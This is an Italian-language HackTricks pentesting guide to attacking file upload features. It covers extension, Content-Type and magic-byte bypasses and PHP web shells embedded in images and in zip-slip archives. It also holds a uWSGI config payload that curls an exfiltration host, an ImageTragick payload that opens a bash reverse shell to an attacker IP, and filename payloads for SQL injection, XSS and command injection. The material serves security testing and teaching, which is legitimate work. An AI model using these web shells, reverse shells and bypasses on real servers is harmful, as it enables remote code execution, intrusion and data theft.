# Caricamento file

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per il File Upload

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass dei controlli sulle estensioni dei file

1. Se applicabile, **controlla** le **estensioni precedenti.** Testale anche usando alcune **lettere maiuscole**: _pHp, .pHP5, .PhAr ..._
2. _Controlla **aggiungendo una estensione valida prima** dell'estensione eseguibile (usa anche le estensioni precedenti):_
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforce** di tutti i caratteri **ascii** e **Unicode**. (_Nota che puoi anche provare a usare le **estensioni** **precedentemente** menzionate_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** lato server con tecniche come il **raddoppio** dell'**estensione** o **aggiungendo dati spazzatura** (byte **null**) tra le estensioni. _Puoi anche usare le **estensioni precedenti** per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un ulteriore livello di estensioni** ai controlli precedenti:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**estensione eseguibile prima** della estensione valida e spera che il server sia mal configurato. (utile per sfruttare misconfigurazioni Apache dove qualsiasi cosa con estensione **.php**, ma **non necessariamente terminante in .php**, eseguirà codice):
- _ex: file.php.png_
7. Usare gli **NTFS alternate data stream (ADS)** su **Windows**. In questo caso verrà inserito il carattere due punti ":" dopo un'estensione proibita e prima di una permessa. Di conseguenza verrà creato sul server un **file vuoto con l'estensione proibita** (es. "file.asax:.jpg”). Questo file potrebbe essere modificato più tardi usando altre tecniche come il suo short filename. Il pattern "**::$data**” può anche essere usato per creare file non vuoti. Pertanto, aggiungere un punto dopo questo pattern può essere utile per bypassare ulteriori restrizioni (es. "file.asp::$data.”)
8. Prova a superare i limiti di lunghezza del nome file. L'estensione valida viene troncata. E il PHP malevolo rimane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass dei controlli **Content-Type** impostando il **valore** dell'header **Content-Type** a: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass del controllo del **magic number** aggiungendo all'inizio del file i **byte di una vera immagine** (per confondere il comando _file_). Oppure inserire la shell all'interno dei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure puoi anche **introdurre il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se viene applicata una **compressione** all'immagine, ad esempio usando alcune librerie standard PHP come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il chunk PLTE [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche **ridimensionare** l'immagine, usando ad esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare il chunk IDAT [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **sopravvive a un ridimensionamento**, usando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi usare il chunk tEXt [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Altri trucchi da verificare

- Trova una vulnerabilità che permetta di **rinominare** il file già caricato (per cambiare l'estensione).
- Trova una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possibili divulgazioni di informazioni**:
1. Carica **più volte** (e **allo stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricare un file con **".", ".." o "..." come nome**. Per esempio, in Apache su **Windows**, se l'applicazione salva i file uploadati in "/www/uploads/" la filename "." creerà un file chiamato "uploads" in "/www/".
4. Carica un file che potrebbe non essere eliminato facilmente come **"...:.jpg"** su **NTFS**. (Windows)
5. Carica un file su **Windows** con **caratteri non validi** come `|<>*?”` nel nome. (Windows)
6. Carica un file su **Windows** usando nomi **riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Prova anche a **caricare un eseguibile** (.exe) o un **.html** (meno sospetto) che **eseguirà codice** quando accidentalmente aperto dalla vittima.

### Trucchi con estensioni speciali

Se stai cercando di caricare file su un server **PHP**, [dai un'occhiata al trucco **.htaccess** per eseguire codice](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un server **ASP**, [dai un'occhiata al trucco **.config** per eseguire codice](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per Java, ma per PHP, e possono essere **usati come un file php** (eseguiti con php, o inclusi dentro uno script...)

L'estensione `.inc` è a volte usata per file php che servono solo per **includere altri file**, quindi, a un certo punto, qualcuno potrebbe aver permesso che **questa estensione venisse eseguita**.

## **Jetty RCE**

Se puoi caricare un file XML in un server Jetty puoi ottenere [RCE perché i nuovi \*.xml e \*.war vengono processati automaticamente](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come indicato nell'immagine seguente, carica il file XML in $JETTY_BASE/webapps/ e aspetta la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità consulta la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate nei server uWSGI se si ha la possibilità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI usano una sintassi specifica per incorporare variabili "magiche", placeholder e operatori. In particolare, l'operatore '@', usato come `@(filename)`, è progettato per includere il contenuto di un file. Tra i vari schemi supportati in uWSGI, lo schema "exec" è particolarmente potente, permettendo la lettura dei dati dallo standard output di un processo. Questa funzionalità può essere manipolata per scopi malevoli come Remote Command Execution o Arbitrary File Write/Read quando viene processato un file di configurazione `.ini`.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari schemi:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione venga attivata e parsata, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un Denial of Service) oppure il file deve essere impostato su auto-reload. La funzionalità auto-reload, se abilitata, ricarica il file a intervalli specificati quando rileva modifiche.

È cruciale comprendere la natura permissiva del parsing dei file di configurazione di uWSGI. Più nello specifico, il payload discusso può essere inserito in un file binario (ad esempio un'immagine o un PDF), ampliando ulteriormente la portata della potenziale exploitation.

## **wget File Upload/SSRF Trucco**

In alcune occasioni potresti scoprire che un server sta usando **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe controllare che l'estensione dei file scaricati sia all'interno di una whitelist per assicurarsi che vengano scaricati solo file consentiti. Tuttavia, **questa verifica può essere bypassata.**\

La **lunghezza massima** di un **nome file** in **linux** è **255**, tuttavia, **wget** tronca i nomi dei file a **236** caratteri. Puoi **scaricare un file chiamato "A"\*232+".php"+".gif"**, questo nome file **bypass** il **controllo** (poiché in questo esempio **".gif"** è un'**estensione valida**) ma `wget` rinominerà il file in **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **un'altra opzione** a cui potresti pensare per bypassare questo controllo è far sì che il **server HTTP reindirizzi a un file diverso**, così l'URL iniziale supererà il controllo e poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non venga usato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è uno strumento potente progettato per assistere Pentesters e Bug Hunters nel testare i meccanismi di file upload. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle web application.

### Corrupting upload indices with snprintf quirks (historical)

Alcuni handler di upload legacy che usano `snprintf()` o funzioni simili per costruire array multi-file da un singolo upload possono essere ingannati nel falsificare la struttura `_FILES`. A causa di incoerenze e troncamenti nel comportamento di `snprintf()`, un singolo upload appositamente costruito può apparire come più file indicizzati lato server, confondendo la logica che assume una forma rigorosa (es. trattandolo come upload multi-file e prendendo branche non sicure). Pur essendo niche oggi, questo pattern di “index corruption” riemerge occasionalmente in CTF e codebase più datate.

## From File upload to other vulnerabilities

- Imposta **filename** su `../../../tmp/lol.png` e prova a ottenere un **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti riuscire a ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere una **XSS**
- Imposta **filename** su `; sleep 10;` per testare qualche command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi **indicare al web server di recuperare un'immagine da un URL** potresti provare ad abusare di un [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **image** verrà **salvata** in qualche sito **pubblico**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **rubare informazioni di ogni visitatore**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente costruiti per XSS: la [pagina seguente mostra come **iniettare dati PDF per ottenere l'esecuzione di JS**](../xss-cross-site-scripting/pdf-injection.md). Se puoi uploadare PDF potresti preparare un PDF che esegua JS arbitrario seguendo le indicazioni fornite.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Verifica se esiste un **limite di dimensione** per l'upload dei file

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulta [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri tipi di file.

## Zip/Tar File Automatically decompressed Upload

Se puoi uploadare una ZIP che verrà decompressa all'interno del server, puoi fare 2 cose:

### Symlink

Carica un archivio contenente soft link ad altri file, quindi, accedendo ai file decompressi accederai ai file linkati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione inattesa di file in directory durante la decompressione è un problema significativo. Nonostante le ipotesi iniziali che questa configurazione potesse proteggere dall'esecuzione di comandi a livello OS tramite upload di file malevoli, il supporto gerarchico della compressione e le capacità di directory traversal del formato di archivio ZIP possono essere sfruttate. Questo permette agli attaccanti di aggirare le restrizioni e uscire dalle directory di upload sicure manipolando la funzionalità di decompressione dell'applicazione target.

Un exploit automatizzato per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilità può essere usata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, l'**symlink trick with evilarc** è un'opzione. Se l'obiettivo è mirare a un file come `/flag.txt`, dovresti creare un symlink a quel file nel tuo sistema. Questo garantisce che evilarc non incontri errori durante la sua operazione.

Di seguito è riportato un esempio di codice Python usato per creare un file zip malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abuso della compressione per file spraying**

Per maggiori dettagli **consulta il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Viene scritto codice PHP per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: I nomi dei file all'interno dello zip vengono modificati usando vi o un editor esadecimale, sostituendo "xxA" con "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick, 7.0.1-1)** (dal [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporare PHP Shell in PNG

Incorporare una PHP shell nel chunk IDAT di un file PNG può bypassare efficacemente alcune operazioni di image processing. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, essendo comunemente usate rispettivamente per il ridimensionamento e il resampling delle immagini. La capacità della PHP shell incorporata di rimanere inalterata da queste operazioni rappresenta un vantaggio significativo in alcuni casi d'uso.

Una esplorazione dettagliata di questa tecnica, inclusa la metodologia e le potenziali applicazioni, è disponibile nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## File Polyglot

I file polyglot fungono da strumento unico nella cybersecurity, agendo come camaleonti che possono esistere validamente in più formati di file contemporaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF che come archivio RAR. Questi file non sono limitati a questa coppia; sono possibili anche combinazioni come GIF e JS o PPT e JS.

L'utilità principale dei polyglot risiede nella loro capacità di eludere misure di sicurezza che filtrano i file in base al tipo. Una pratica comune in molte applicazioni consiste nel permettere solo determinati tipi di file per l'upload — come JPEG, GIF, o DOC — per mitigare il rischio posto da formati potenzialmente dannosi (es. JS, PHP, o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più tipi di file, può aggirare furtivamente queste restrizioni.

Nonostante la loro adattabilità, i polyglot incontrano dei limiti. Per esempio, mentre un polyglot potrebbe incarnare simultaneamente un file PHAR (PHp ARchive) e un JPEG, il successo del suo upload potrebbe dipendere dalle policy della piattaforma riguardo alle estensioni dei file. Se il sistema è rigoroso sulle estensioni consentite, la semplice dualità strutturale di un polyglot potrebbe non essere sufficiente a garantire l'upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Caricare JSON validi come se fossero PDF

Come evitare il rilevamento del tipo di file caricando un file JSON valido anche se non consentito, fingendo un file PDF (tecniche tratte da **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: As long as the `%PDF` magic bytes are in the first 1024 bytes it’s valid (get example from post)
- **`pdflib` library**: Add a fake PDF format inside a filed of the JSON so the library thinks it’s a pdf (get example from post)
- **`file` binary**: It can read up to 1048576 bytes from a file. Just create a JSON bigger than that so it cannot parse the content as a json and then inside the JSON put the initial part of a real PDF and it’ll think it’s a PDF

## Riferimenti

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
